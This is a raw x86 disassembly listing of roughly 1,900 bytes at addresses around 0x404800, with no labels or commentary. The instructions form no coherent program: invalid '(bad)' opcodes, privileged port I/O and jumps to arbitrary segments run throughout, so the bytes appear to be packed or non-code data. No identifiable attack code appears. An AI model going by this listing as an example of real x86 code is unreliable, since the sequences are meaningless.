  40480c:	sub    eax,0x8fba4479
  404811:	nop    DWORD PTR [ebp-0x5d1f79ac]
  404818:	push   edx
  404819:	ja     0x404812
  40481b:	movnti DWORD PTR [esi-0x723fa362],esp
  404822:	push   ds
  404823:	inc    ebp
  404824:	jmp    0xd5c77645
  404829:	xchg   edx,eax
  40482a:	in     eax,dx
  40482b:	adc    DWORD PTR [eax+ebx*4],edi
  40482e:	sub    esp,DWORD PTR [ecx]
  404830:	aaa    
  404831:	lods   al,BYTE PTR ds:[esi]
  404832:	inc    esp
  404833:	jb     0x40482e
  404835:	mov    esp,0xf8174e69
  40483a:	jmp    0x4047bf
  40483c:	cmp    DWORD PTR [eax],ebx
  40483e:	mov    BYTE PTR [eax],dl
  404840:	dec    ebp
  404841:	jp     0x404821
  404843:	jae    0x404893
  404845:	and    BYTE PTR [eax+0x76],bh
  404848:	ret    0x4f1
  40484b:	aad    0x61
  40484d:	adc    ebp,DWORD PTR [edi]
  40484f:	sub    al,0xa2
  404851:	sar    DWORD PTR [esi+ecx*2-0x7264b1fe],1
  404858:	test   DWORD PTR [eax-0x240c3bd4],esp
  40485e:	repnz push ecx
  404860:	xchg   DWORD PTR [edi+0x1e4ba526],ecx
  404866:	dec    edi
  404867:	jg     0x4048df
  404869:	lods   al,BYTE PTR ds:[esi]
  40486a:	js     0x40483f
  40486c:	test   BYTE PTR [ecx+eax*4],cl
  40486f:	mov    edx,0x9c4daccf
  404874:	aas    
  404875:	sub    eax,0x1268bcd6
  40487a:	xchg   ebp,eax
  40487b:	jno    0x404832
  40487d:	in     al,dx
  40487e:	test   DWORD PTR [esi-0x6fcec391],ebx
  404884:	jmp    0xbff4:0xc1499dec
  40488b:	(bad)  [edi]
  40488d:	jecxz  0x404869
  40488f:	add    esp,edx
  404891:	xor    esi,DWORD PTR [ebx+0x2]
  404894:	jo     0x4048c4
  404896:	pop    esp
  404897:	mov    dl,0x9d
  404899:	xor    dl,BYTE PTR [ecx]
  40489b:	cdq    
  40489c:	mov    ds:0xa3a46c5,al
  4048a1:	test   DWORD PTR [ebx],0xf74de09b
  4048a7:	or     dl,dl
  4048a9:	dec    ebx
  4048aa:	push   es
  4048ab:	mov    dh,BYTE PTR [ecx]
  4048ad:	(bad)  
  4048ae:	adc    bh,dl
  4048b0:	mov    ah,0xda
  4048b2:	les    eax,FWORD PTR [edx+0x7c552f7c]
  4048b8:	ja     0x404931
  4048ba:	std    
  4048bb:	push   eax
  4048bc:	adc    al,0xa0
  4048be:	cmp    BYTE PTR [ecx+0x3bb34109],ah
  4048c4:	pop    ds
  4048c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048c6:	std    
  4048c7:	cld    
  4048c8:	sub    al,BYTE PTR [edi+0x69b40d36]
  4048ce:	sbb    eax,0xa7ef59b0
  4048d3:	int    0xfe
  4048d5:	pop    ebx
  4048d6:	sbb    bh,al
  4048d8:	imul   eax,esp,0x34
  4048db:	es sbb al,0x95
  4048de:	add    eax,0xab92cd9c
  4048e3:	and    eax,0x7730c97f
  4048e8:	cmp    BYTE PTR [edx-0x16f5cb0e],al
  4048ee:	ror    DWORD PTR [eax+0x42e81ad1],1
  4048f4:	dec    ebx
  4048f5:	mov    ah,BYTE PTR [esi]
  4048f7:	mov    ah,0xbe
  4048f9:	shl    BYTE PTR [ebx+eiz*4+0x1a896b37],1
  404900:	inc    edi
  404901:	cmp    DWORD PTR [edi+0x45],0x3
  404905:	into   
  404906:	test   BYTE PTR [esi+0x20],bh
  404909:	arpl   cx,dx
  40490b:	push   edx
  40490c:	jb     0x4048f0
  40490e:	test   eax,0xef7e8bdb
  404913:	push   ecx
  404914:	out    0x72,al
  404916:	cld    
  404917:	and    ebx,DWORD PTR [edx]
  404919:	stos   BYTE PTR es:[edi],al
  40491a:	mov    ah,0x54
  40491c:	(bad)  
  40491d:	push   edi
  40491e:	inc    edx
  40491f:	fdivp  st(6),st
  404921:	outs   dx,DWORD PTR ds:[esi]
  404922:	outs   dx,DWORD PTR ds:[esi]
  404923:	push   ds
  404924:	(bad)  
  404925:	mov    WORD PTR [ebx],cs
  404927:	daa    
  404928:	addr16 inc ebp
  40492a:	aaa    
  40492b:	fisub  DWORD PTR [ecx-0x5a]
  40492e:	jg     0x40492b
  404930:	lahf   
  404931:	call   0x1114a72b
  404936:	add    dh,BYTE PTR [ebx-0x74]
  404939:	mov    ecx,0xc4f549f6
  40493e:	mov    dl,0x84
  404940:	sub    ecx,DWORD PTR ds:0xe42eeae7
  404946:	cmp    eax,0x21896b19
  40494b:	push   ds
  40494c:	fucomp st(3)
  40494e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40494f:	bound  ebx,QWORD PTR [ebx]
  404951:	mov    ecx,0x79a9974d
  404956:	icebp  
  404957:	cmp    al,0x8e
  404959:	imul   edi,DWORD PTR ds:0x492026e0,0x15
  404960:	hlt    
  404961:	mov    ecx,0x1ff4d215
  404966:	fs dec eax
  404968:	loop   0x40499b
  40496a:	scas   al,BYTE PTR es:[edi]
  40496b:	lds    edi,FWORD PTR [ecx-0x4e0f4e85]
  404971:	pop    ebx
  404972:	fisubr WORD PTR gs:[edi+0x51781430]
  404979:	jae    0x4049e5
  40497b:	arpl   WORD PTR [ebp+eiz*8-0xa],di
  40497f:	enter  0x5813,0x90
  404983:	and    dh,ah
  404985:	push   cs
  404986:	fidiv  DWORD PTR gs:[edx+esi*2+0x48b8a4be]
  40498e:	dec    edi
  40498f:	sub    DWORD PTR [ecx-0x1a],edi
  404992:	call   0x2f22:0x3b143719
  404999:	mov    DWORD PTR [ecx],esi
  40499b:	cmp    ch,al
  40499d:	(bad)  
  40499e:	cmp    BYTE PTR [edx],dl
  4049a0:	paddusb mm4,mm4
  4049a3:	mov    al,0xbc
  4049a5:	add    edx,DWORD PTR [ebx-0x24e0176c]
  4049ab:	jecxz  0x404931
  4049ad:	in     eax,0xbf
  4049af:	outs   dx,DWORD PTR es:[esi]
  4049b1:	lods   al,BYTE PTR ds:[esi]
  4049b2:	jbe    0x404a05
  4049b4:	(bad)  
  4049b5:	mov    esi,0x24ccb77d
  4049ba:	jne    0x404949
  4049bc:	xor    al,0xc7
  4049be:	out    dx,al
  4049bf:	ja     0x404a0e
  4049c1:	les    esi,FWORD PTR [edi]
  4049c3:	fistp  QWORD PTR [ebx-0x614d83ce]
  4049c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ca:	dec    esi
  4049cb:	cli    
  4049cc:	and    edx,0xffffffc8
  4049cf:	xacquire xchg BYTE PTR [esi-0x2f77c231],ch
  4049d6:	mov    ebx,0x717b2c81
  4049db:	adc    al,0xf5
  4049dd:	in     eax,dx
  4049de:	mov    dl,0x96
  4049e0:	push   edi
  4049e1:	sbb    bh,BYTE PTR [esi]
  4049e3:	(bad)  
  4049e4:	pop    esi
  4049e5:	out    dx,al
  4049e6:	rol    BYTE PTR [esi],cl
  4049e8:	jb     0x404a0e
  4049ea:	ins    DWORD PTR es:[edi],dx
  4049eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049ec:	call   FWORD PTR [ebx]
  4049ee:	push   edi
  4049ef:	or     BYTE PTR [edi+0x0],bl
  4049f2:	push   ebx
  4049f3:	add    eax,0xe53401d9
  4049f8:	clc    
  4049f9:	imul   DWORD PTR [ecx]
  4049fb:	fistp  WORD PTR ds:0x65baddb6
  404a01:	add    BYTE PTR [edi+0x5],cl
  404a04:	push   ebx
  404a05:	xchg   edi,eax
  404a06:	mov    ebx,DWORD PTR [ebp-0x64]
  404a09:	jmp    FWORD PTR [ecx+0x44a465f7]
  404a0f:	fnstenv [edx-0x7a]
  404a12:	enter  0x1a5,0xcf
  404a16:	add    ebp,DWORD PTR [ecx+0x0]
  404a19:	push   0x6b031900
  404a1e:	mov    ah,0xac
  404a20:	inc    eax
  404a21:	jmp    0xa9030fbb
  404a26:	out    0xf,eax
  404a28:	adc    ebp,DWORD PTR [esi-0x57]
  404a2b:	mov    ecx,0x665f098b
  404a30:	inc    edi
  404a31:	and    BYTE PTR [eax+eax*1-0x7c],al
  404a35:	outs   dx,DWORD PTR ds:[esi]
  404a36:	jmp    0xc31e:0xacc0c13b
  404a3d:	cwde   
  404a3e:	out    0x3b,eax
  404a40:	pop    esp
  404a41:	ins    DWORD PTR es:[edi],dx
  404a42:	mov    esi,0x51b3e4f6
  404a47:	ffreep st(1)
  404a49:	xchg   edx,eax
  404a4a:	mov    ah,0x22
  404a4c:	push   0xaad4fedc
  404a51:	test   esp,esi
  404a53:	xchg   esp,esp
  404a55:	inc    ebp
  404a56:	add    BYTE PTR [esi],bh
  404a58:	sbb    DWORD PTR [edi],ebx
  404a5a:	xor    ebx,edx
  404a5c:	cld    
  404a5d:	clc    
  404a5e:	stc    
  404a5f:	loopne 0x404a74
  404a61:	out    dx,eax
  404a62:	rol    BYTE PTR [edi+0x6b],cl
  404a65:	ror    DWORD PTR [ecx-0x29edf5c3],1
  404a6b:	out    dx,al
  404a6c:	add    esp,DWORD PTR [ecx]
  404a6e:	lea    esp,gs:[ebp+edi*8-0x3c]
  404a73:	in     al,dx
  404a74:	cs mov ah,0x7c
  404a77:	ins    BYTE PTR es:[edi],dx
  404a78:	iret   
  404a79:	sar    ch,1
  404a7b:	cdq    
  404a7c:	push   edx
  404a7d:	cmp    esi,esi
  404a7f:	leave  
  404a80:	xor    al,0xfe
  404a82:	pop    ss
  404a83:	hlt    
  404a84:	(bad)
  404a88:	adc    ebp,DWORD PTR [eax+0x9]
  404a8b:	dec    ebx
  404a8c:	sub    ebx,esi
  404a8e:	mov    ds:0x8c6b0609,al
  404a93:	and    bl,cl
  404a95:	iret   
  404a96:	and    edx,DWORD PTR [edx+0x6de87693]
  404a9c:	jmp    0x404a23
  404a9e:	add    eax,0x7000d38c
  404aa3:	in     eax,0x4e
  404aa5:	mov    BYTE PTR [ebx],bl
  404aa7:	cli    
  404aa8:	into   
  404aa9:	imul   eax,DWORD PTR [esp+ecx*4+0x27],0xffffffab
  404aae:	fdivr  QWORD PTR [edi+0x3c]
  404ab1:	mov    eax,0xc4521667
  404ab6:	xchg   ebp,eax
  404ab7:	fistp  DWORD PTR [ecx-0x2e]
  404aba:	nop
  404abb:	test   eax,0x6b25924a
  404ac0:	test   al,0x3b
  404ac2:	push   edx
  404ac3:	shr    DWORD PTR [edi],cl
  404ac5:	pushf  
  404ac6:	lds    edi,FWORD PTR [edi]
  404ac8:	ror    BYTE PTR [edx],cl
  404aca:	jno    0x404ae3
  404acc:	inc    esp
  404acd:	or     ch,bl
  404acf:	mov    al,ds:0xf83f5c4c
  404ad4:	sub    ch,BYTE PTR [esi+0x25]
  404ad7:	shl    cl,0xcc
  404ada:	pop    es
  404adb:	sbb    eax,0xa23649c2
  404ae0:	adc    dl,ah
  404ae2:	lahf   
  404ae3:	mov    eax,0x221e48f1
  404ae8:	mov    ebp,0xbfe90896
  404aed:	ror    BYTE PTR [edi+0x356d2f7e],1
  404af3:	out    0x2d,eax
  404af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404af6:	mov    edi,0x71e19af8
  404afb:	pop    ss
  404afc:	leave  
  404afd:	fcomp  DWORD PTR [ecx+0x45f68ad8]
  404b03:	push   ds
  404b04:	cld    
  404b05:	cmp    bh,0xfd
  404b08:	pop    esp
  404b09:	ins    BYTE PTR es:[edi],dx
  404b0a:	in     al,0x33
  404b0c:	adc    al,0x91
  404b0e:	pop    edx
  404b0f:	mov    WORD PTR [edi-0x76],?
  404b12:	addr16 popf 
  404b14:	inc    esp
  404b15:	fldcw  WORD PTR [bx]
  404b18:	inc    ebp
  404b19:	scas   al,BYTE PTR es:[edi]
  404b1a:	out    dx,al
  404b1b:	retf   
  404b1c:	popf   
  404b1d:	mov    edx,0x5a08bcbb
  404b22:	lods   al,BYTE PTR ds:[esi]
  404b23:	mov    ch,dl
  404b25:	fidivr WORD PTR [ebx]
  404b27:	xchg   al,dl
  404b29:	inc    ebx
  404b2a:	stc    
  404b2b:	pusha  
  404b2c:	jmp    0xe519cc42
  404b31:	push   esi
  404b32:	lahf   
  404b33:	xchg   edx,eax
  404b34:	sub    eax,0xfbaca916
  404b39:	jmp    0x9ba:0x321f5c6f
  404b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b41:	sbb    eax,esp
  404b43:	scas   eax,DWORD PTR es:[edi]
  404b44:	call   0x88aa8225
  404b49:	adc    ebx,eax
  404b4b:	imul   edx,eax,0xa10b0c5
  404b51:	add    DWORD PTR [edx],edi
  404b53:	and    eax,0x1ded54d1
  404b58:	fcmovne st,st(7)
  404b5a:	and    eax,0xf26387af
  404b5f:	jb     0x404bba
  404b61:	mov    ecx,0x3b01075e
  404b66:	mov    bh,0x82
  404b68:	(bad)  
  404b69:	sti    
  404b6a:	addr16 mov edi,0x29d4a77c
  404b70:	retf   0x9239
  404b73:	or     al,0x78
  404b75:	dec    ebp
  404b76:	pushf  
  404b77:	jg     0x404b0b
  404b79:	mov    es,WORD PTR [eax+0x2e40eda1]
  404b7f:	ds mov ebp,0x9e07436b
  404b85:	cdq    
  404b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b87:	shl    esp,1
  404b89:	xchg   edi,eax
  404b8a:	push   ss
  404b8b:	pop    edx
  404b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b8d:	push   0x5a80924e
  404b92:	jmp    0x404b4b
  404b94:	jns    0x404b26
  404b96:	dec    eax
  404b97:	xor    ebx,ebp
  404b99:	pop    eax
  404b9a:	iret   
  404b9b:	dec    edi
  404b9c:	gs push 0xa14aa4b2
  404ba2:	inc    eax
  404ba3:	mov    bl,0x3c
  404ba5:	xor    dl,al
  404ba7:	sub    dh,BYTE PTR [ecx-0x3c]
  404baa:	outs   dx,BYTE PTR ds:[esi]
  404bab:	fpatan 
  404bad:	les    edx,FWORD PTR [ebp-0x6b]
  404bb0:	imul   esi,DWORD PTR [esi-0x4653bc57],0xffffff91
  404bb7:	mov    esi,0xa90d09ec
  404bbc:	add    BYTE PTR [ebp-0xa],ah
  404bbf:	dec    ecx
  404bc0:	pop    ds
  404bc1:	test   DWORD PTR [ecx],esi
  404bc3:	stos   DWORD PTR es:[edi],eax
  404bc4:	push   ss
  404bc5:	pop    ecx
  404bc6:	call   0x991c:0xcfb5ee08
  404bcd:	pop    eax
  404bce:	ret    
  404bcf:	jno    0x404be1
  404bd1:	mov    dh,BYTE PTR [edi-0x7a]
  404bd4:	push   ebx
  404bd5:	(bad)  
  404bd7:	and    ebx,DWORD PTR [edx+0x1a]
  404bda:	daa    
  404bdb:	inc    edx
  404bdc:	jl     0x404c5a
  404bde:	lods   eax,DWORD PTR ds:[esi]
  404bdf:	outs   dx,DWORD PTR ds:[esi]
  404be0:	mov    eax,0xd41d8433
  404be5:	fdivr  QWORD PTR ds:0x85e82bfa
  404beb:	adc    ah,BYTE PTR [ecx]
  404bed:	dec    ebx
  404bee:	call   0xed27:0x76c25234
  404bf5:	scas   eax,DWORD PTR es:[edi]
  404bf6:	jge    0x404b92
  404bf8:	add    eax,DWORD PTR [edi]
  404bfa:	cwde   
  404bfb:	adc    dh,BYTE PTR [ebp-0x221a3cf8]
  404c01:	sbb    ch,BYTE PTR [ebx+0x2380846a]
  404c07:	sbb    edi,DWORD PTR [ebp-0x2a]
  404c0a:	adc    DWORD PTR [eax-0x5a],0x3def410a
  404c11:	pop    esi
  404c12:	cli    
  404c13:	je     0x404c35
  404c15:	out    dx,al
  404c16:	dec    ecx
  404c17:	mov    eax,0xfa2b248a
  404c1c:	dec    ebp
  404c1d:	xchg   BYTE PTR [esi+0x398e4723],al
  404c23:	je     0x404c48
  404c25:	sub    ah,BYTE PTR [esi-0x27]
  404c28:	inc    eax
  404c29:	and    BYTE PTR [ecx+0x12d608c5],al
  404c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c30:	aad    0xb9
  404c32:	int    0xef
  404c34:	mov    edi,es
  404c36:	pop    eax
  404c37:	inc    ebx
  404c38:	xor    bl,BYTE PTR [ebx+esi*4]
  404c3b:	push   cs
  404c3c:	push   es
  404c3d:	dec    edi
  404c3e:	inc    ebx
  404c3f:	out    dx,al
  404c40:	retf   
  404c41:	push   esp
  404c42:	xchg   ebx,eax
  404c43:	not    BYTE PTR [ecx]
  404c45:	iret   
  404c46:	or     eax,0xb5469205
  404c4b:	data16 fs mov bl,0x29
  404c4f:	xor    eax,0xa9c53dd3
  404c54:	pop    ecx
  404c55:	inc    esi
  404c56:	ins    BYTE PTR es:[edi],dx
  404c57:	mov    DWORD PTR [eax],eax
  404c59:	fucomp st(1)
  404c5b:	inc    edx
  404c5c:	mov    ebp,0xa227d733
  404c61:	inc    edi
  404c62:	cli    
  404c63:	dec    esi
  404c64:	std    
  404c65:	jno    0x404cc1
  404c67:	test   DWORD PTR ds:0x2303d5a3,esi
  404c6d:	mov    ebx,0x42bd87d7
  404c72:	mov    al,ds:0x9e3408da
  404c77:	cmp    DWORD PTR [edx+0x7f],0xbd4fac41
  404c7e:	mov    ecx,0xcf9d9be8
  404c83:	xor    DWORD PTR [eax+0x44],ebp
  404c86:	push   ebp
  404c87:	xor    al,0xc2
  404c89:	pop    ebx
  404c8a:	or     DWORD PTR [ebp-0x3],esp
  404c8d:	lods   eax,DWORD PTR ds:[esi]
  404c8e:	fist   DWORD PTR [edx+0x188bd0e9]
  404c94:	jmp    0xfcbf:0xd2eba13f
  404c9b:	push   ebx
  404c9c:	aam    0x9a
  404c9e:	test   DWORD PTR ds:0xc8f945cc,0x34c56fc7
  404ca8:	jmp    0xfba4:0x16cb4dc9
  404caf:	aad    0xe2
  404cb1:	aas    
  404cb2:	aas    
  404cb3:	or     ebx,0x5ac4ed2
  404cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cba:	mov    dh,0x7b
  404cbc:	push   esi
  404cbd:	fnstcw WORD PTR [edi]
  404cbf:	popf   
  404cc0:	jecxz  0x404c53
  404cc2:	bound  eax,QWORD PTR [ecx]
  404cc4:	outs   dx,DWORD PTR ds:[esi]
  404cc5:	ss icebp 
  404cc7:	loope  0x404d32
  404cc9:	fwait
  404cca:	push   ecx
  404ccb:	cs push esi
  404ccd:	popa   
  404cce:	xor    eax,0x1e0dfde5
  404cd3:	dec    edx
  404cd4:	sub    BYTE PTR [edx-0x39],bl
  404cd7:	call   esp
  404cd9:	jg     0x404ca2
  404cdb:	xchg   esi,eax
  404cdc:	add    bh,BYTE PTR [edi+0x79]
  404cdf:	fisubr WORD PTR [eax-0x39]
  404ce2:	dec    ecx
  404ce3:	(bad)  [ebx]
  404ce5:	sbb    esi,DWORD PTR [esi]
  404ce7:	push   esi
  404ce8:	pop    eax
  404ce9:	or     eax,0x3b84484b
  404cee:	sub    bh,bh
  404cf0:	cs inc esi
  404cf2:	aaa    
  404cf3:	(bad)  
  404cf4:	test   al,0x41
  404cf6:	jns    0x404d35
  404cf8:	daa    
  404cf9:	sbb    al,0x3f
  404cfb:	jmp    DWORD PTR [ebp-0x72fe68c8]
  404d01:	or     DWORD PTR [ecx-0x5],ebp
  404d04:	adc    BYTE PTR [eax-0x2a],bh
  404d07:	ins    BYTE PTR es:[edi],dx
  404d08:	out    0x93,eax
  404d0a:	inc    esi
  404d0b:	push   ss
  404d0c:	push   edx
  404d0d:	outs   dx,DWORD PTR ds:[esi]
  404d0e:	lods   eax,DWORD PTR ds:[esi]
  404d0f:	push   edi
  404d10:	or     BYTE PTR [edx-0x1],0xd3
  404d14:	sbb    edx,DWORD PTR [ecx-0x238ad381]
  404d1a:	(bad)
  404d1d:	(bad)  
  404d1e:	mov    esp,0x398567a1
  404d23:	mov    bl,0x4c
  404d25:	pop    ds
  404d26:	add    eax,0x3e
  404d29:	or     DWORD PTR [ebx-0xb],ecx
  404d2c:	adc    DWORD PTR [edx+0x666618aa],eax
  404d32:	sbb    ebp,ecx
  404d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d35:	cmp    DWORD PTR [edi+edx*4-0x4fe9557],ebx
  404d3c:	pop    ds
  404d3d:	ror    DWORD PTR [ebx+0x4ed08e9b],1
  404d43:	xor    esi,edx
  404d45:	stc    
  404d46:	mov    esp,0x46f07f83
  404d4b:	sub    eax,DWORD PTR [ecx-0x444cdae6]
  404d51:	pop    esi
  404d52:	push   ds
  404d53:	(bad)  
  404d54:	jg     0x404db4
  404d56:	mov    ebp,0x99f32898
  404d5b:	sahf   
  404d5c:	jmp    0x45ba:0x58cbec1b
  404d63:	mov    esi,0xc34d6b78
  404d68:	xor    BYTE PTR [ebx],al
  404d6a:	ret    0x8c11
  404d6d:	std    
  404d6e:	outs   dx,DWORD PTR ds:[esi]
  404d6f:	stos   DWORD PTR es:[edi],eax
  404d70:	ror    DWORD PTR [eax-0x37703ad2],1
  404d76:	daa    
  404d77:	pop    ss
  404d78:	mov    ch,0x84
  404d7a:	cmp    DWORD PTR [ecx],esp
  404d7c:	adc    BYTE PTR [eax],0xd3
  404d7f:	inc    edx
  404d80:	push   ds
  404d81:	ss mov bh,0x2
  404d84:	jne    0x404d44
  404d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d87:	fbld   TBYTE PTR [edx-0x4]
  404d8a:	inc    ebx
  404d8b:	js     0x404d19
  404d8d:	mov    ebp,0xb0eea73c
  404d92:	dec    edx
  404d93:	cwde   
  404d94:	pop    esp
  404d95:	xlat   BYTE PTR ds:[ebx]
  404d96:	add    eax,0xa73df915
  404d9b:	jns    0x404dff
  404d9d:	xor    al,0x83
  404d9f:	pusha  
  404da0:	inc    BYTE PTR [eax+ebx*8+0x2d]
  404da4:	shl    BYTE PTR ds:0x8305ad6d,cl
  404daa:	clc    
  404dab:	loope  0x404d74
  404dad:	mov    dl,0x23
  404daf:	lods   eax,DWORD PTR ds:[esi]
  404db0:	push   ds
  404db1:	pop    ebp
  404db2:	ins    DWORD PTR es:[edi],dx
  404db3:	pop    esp
  404db4:	jb     0x404d4e
  404db6:	push   0x9f28a67c
  404dbb:	dec    edx
  404dbc:	adc    DWORD PTR [edi],ebp
  404dbe:	fwait
  404dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dc0:	xchg   ebx,eax
  404dc1:	adc    ebx,edx
  404dc3:	xor    eax,0xcd602dca
  404dc8:	fidiv  DWORD PTR ds:0xb0370960
  404dce:	sbb    esp,DWORD PTR [ebx]
  404dd0:	rcr    DWORD PTR [ecx],0x77
  404dd3:	pop    eax
  404dd4:	in     eax,dx
  404dd5:	(bad)  
  404dd6:	call   0xfe5a:0x3d446aa6
  404ddd:	scas   al,BYTE PTR es:[edi]
  404dde:	outs   dx,BYTE PTR ds:[esi]
  404ddf:	push   0xffffff89
  404de1:	sbb    esp,DWORD PTR [eax]
  404de3:	and    edx,ebx
  404de5:	or     edi,ebx
  404de7:	cwde   
  404de8:	adc    ebp,DWORD PTR [edx]
  404dea:	nop
  404deb:	jge    0x404de1
  404ded:	mov    ebp,0x22b4df14
  404df2:	fcmovb st,st(5)
  404df4:	inc    ebp
  404df5:	jl     0x404e6c
  404df7:	mov    ?,edi
  404df9:	or     al,0x80
  404dfb:	imul   ebx,DWORD PTR [ecx+0x77],0x282fc509
  404e02:	mov    ebx,0x5cf4cf9a
  404e07:	ins    DWORD PTR es:[edi],dx
  404e08:	jbe    0x404e16
  404e0a:	fstp   TBYTE PTR [ebx+edx*1-0x7905530]
  404e11:	jns    0x404e64
  404e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e14:	es push 0x25f60dc4
  404e1a:	daa    
  404e1b:	cli    
  404e1c:	mov    al,ds:0xc300d113
  404e21:	add    BYTE PTR [esi+eiz*1-0x34],bl
  404e25:	sbb    DWORD PTR [edi],esp
  404e27:	cwde   
  404e28:	out    dx,al
  404e29:	and    al,0xdc
  404e2b:	adc    ebx,DWORD PTR [ecx]
  404e2d:	pop    ebp
  404e2e:	pusha  
  404e2f:	jl     0x404e72
  404e31:	sub    ebp,ebx
  404e33:	cmp    eax,0x7e3e9e07
  404e38:	inc    edi
  404e39:	(bad)  
  404e3a:	stos   DWORD PTR es:[edi],eax
  404e3b:	jecxz  0x404e45
  404e3d:	icebp  
  404e3e:	mov    edi,ebx
  404e40:	adc    eax,0x5951149a
  404e45:	(bad)  
  404e46:	and    al,0xbf
  404e48:	dec    edx
  404e49:	test   DWORD PTR [ebp+eiz*2-0x1ace7695],ecx
  404e50:	fs mov bh,0xd8
  404e53:	jns    0x404e4c
  404e55:	add    edi,ebp
  404e57:	sahf   
  404e58:	or     edi,ecx
  404e5a:	or     ecx,esp
  404e5c:	sub    DWORD PTR [edx],edx
  404e5e:	dec    esi
  404e5f:	fstp   st(4)
  404e61:	popa   
  404e62:	jb     0x404e57
  404e64:	sub    al,0x19
  404e66:	loope  0x404e56
  404e68:	outs   dx,DWORD PTR ds:[esi]
  404e69:	mov    al,0xfe
  404e6b:	cdq    
  404e6c:	inc    ebp
  404e6d:	(bad)  
  404e6e:	popa   
  404e6f:	or     esi,DWORD PTR [eax-0x8]
  404e72:	ins    BYTE PTR es:[edi],dx
  404e73:	sub    al,0x52
  404e75:	out    0x3e,eax
  404e77:	ds xchg esi,eax
  404e79:	ret    0xb85e
  404e7c:	test   al,0xa7
  404e7e:	push   es
  404e7f:	aaa    
  404e80:	xchg   esp,eax
  404e81:	jmp    0x404e68
  404e83:	fild   WORD PTR [esp+ebp*2+0x55ce56b0]
  404e8a:	sbb    al,BYTE PTR [ecx-0x10b7c083]
  404e90:	(bad)  
  404e91:	or     al,0x86
  404e93:	inc    edi
  404e94:	addr16 mov esi,DWORD PTR [bx+di-0x4a]
  404e99:	fcom   QWORD PTR [edi-0x4a62b820]
  404e9f:	cmp    al,0x49
  404ea1:	adc    DWORD PTR ds:0x593cc0bd,ebx
  404ea7:	pusha  
  404ea8:	outs   dx,BYTE PTR ds:[esi]
  404ea9:	push   edi
  404eaa:	add    bl,BYTE PTR [ecx+ebp*4-0x16]
  404eae:	hlt    
  404eaf:	dec    edx
  404eb0:	mov    eax,0xfedc4e8
  404eb5:	dec    esp
  404eb6:	(bad)  
  404eb7:	out    dx,eax
  404eb8:	sub    esi,DWORD PTR [edi]
  404eba:	adc    DWORD PTR [ecx-0x34],esi
  404ebd:	and    edi,esi
  404ebf:	hlt    
  404ec0:	xlat   BYTE PTR ds:[ebx]
  404ec1:	mov    al,0x29
  404ec3:	mov    edx,gs
  404ec5:	push   0x9049c360
  404eca:	or     DWORD PTR [ebx],edx
  404ecc:	jb     0x404eec
  404ece:	scas   eax,DWORD PTR es:[edi]
  404ecf:	xchg   edi,eax
  404ed0:	jno    0x404e70
  404ed2:	pop    esp
  404ed3:	xchg   ebp,eax
  404ed4:	out    dx,eax
  404ed5:	mov    WORD PTR [ebp-0x1d],gs
  404ed8:	(bad)  
  404ed9:	mov    ecx,0x5f749d0e
  404ede:	jo     0x404eda
  404ee0:	add    al,dh
  404ee2:	std    
  404ee3:	lods   al,BYTE PTR ds:[esi]
  404ee4:	pop    es
  404ee5:	(bad)  
  404ee6:	cmp    BYTE PTR [edi-0xe],dh
  404ee9:	mov    bl,0x8f
  404eeb:	retf   0xb97f
  404eee:	dec    ebp
  404eef:	mov    esp,0x577f8c23
  404ef4:	xor    al,BYTE PTR [ebx+ebx*8-0x14b447c6]
  404efb:	hlt    
  404efc:	push   0xbdd474f8
  404f01:	loope  0x404f4d
  404f03:	pop    eax
  404f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f05:	mov    ds:0x11d48e72,eax
  404f0a:	pop    eax
  404f0b:	mov    eax,0xd00f6ebb
  404f10:	cmp    eax,0xe82945f7
  404f15:	fild   DWORD PTR [esi+0x3ce08e3e]
  404f1b:	popa   
  404f1c:	xor    eax,0x5bf6169f
  404f21:	sub    eax,0xe1adb977
  404f26:	(bad)  
  404f27:	push   esi
  404f28:	shl    BYTE PTR [eax],1
  404f2a:	hlt    
  404f2b:	inc    ebp
  404f2c:	pop    ecx
  404f2d:	push   ebx
  404f2e:	push   0x7f8028da
  404f33:	mov    al,ds:0x2fc53011
  404f38:	lahf   
  404f39:	rcl    BYTE PTR [ecx],1
  404f3b:	daa    
  404f3c:	retf   0x561a
  404f3f:	repz inc edx
  404f41:	shl    BYTE PTR [ebp-0x4b],1
  404f44:	(bad)  
  404f45:	cli    
  404f46:	test   BYTE PTR [esi+edx*8-0x35],0xc1
  404f4b:	je     0x404ed5
  404f4d:	pop    esp
  404f4e:	push   esp
  404f4f:	xchg   edi,eax
  404f50:	mov    edx,0x8cd908bd
  404f55:	adc    eax,0xb58f2508
  404f5a:	add    al,0xeb
  404f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f5d:	and    eax,0x67b16dc5
  404f62:	fs add bh,0xe8
  404f66:	mov    bh,0x63
  404f68:	gs inc edx
  404f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f6b:	test   ah,ah
  404f6d:	mov    al,0x88
  404f6f:	aam    0x3a
  404f71:	xor    dl,dh
  404f73:	loop   0x404f40
  404f75:	mov    ebx,DWORD PTR [eax]
  404f77:	mov    esp,0x12404516
  404f7c:	loop   0x404f3b
  404f7e:	ds dec esp
  404f80:	rcl    BYTE PTR [esi],1
  404f82:	fs popf 
  404f84:	lea    ebp,[edi]
  404f86:	aaa    
  404f87:	call   0x357f71c
  404f8c:	or     al,0xb3
  404f8e:	inc    ebx
  404f8f:	enter  0xbf87,0x78
  404f93:	ds imul edx,edi,0xfffffff4
  404f97:	loop   0x404fec
  404f99:	cmp    esi,DWORD PTR [ebp+0x31]
